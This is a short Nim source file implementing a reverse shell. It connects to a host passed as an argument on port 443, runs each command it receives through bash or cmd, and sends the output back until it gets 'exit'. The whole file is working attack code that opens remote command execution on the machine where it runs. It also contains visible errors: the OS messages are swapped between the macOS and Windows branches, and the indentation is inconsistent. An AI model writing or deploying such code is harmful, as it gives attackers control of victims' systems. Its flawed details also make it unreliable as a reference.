
#need nimble install argpase
import os, net, osproc


var 
    sock = newSocket()

proc run(TARGET: string, RPORT: int): void =
    
    
    when system.hostOS == "macosx":
        echo "running on Windows!"


        try:
            sock.connect(TARGET, PORT(RPORT))

            while true:
                let cmd = sock.recvLine()
                if cmd == "exit":
                    break
                let result = execProcess("bash -c " & cmd)
                sock.send(result)
        except:
            raise
        finally:
            sock.close

    when system.hostOS == "windows":
        echo "running on Mac OS X!"


    try:
        sock.connect(TARGET, PORT(RPORT))

        while true:
            let cmd = sock.recvLine()
            if cmd == "exit":
                break
            let result = execProcess("cmd /c " & cmd)
            sock.send(result)
    except:
        raise
    finally:
        sock.close

when isMainModule:
  try: 
    let RPORT = 443
    let TARGET = paramStr(1)
    run(TARGET, RPORT)
  except:
    raise
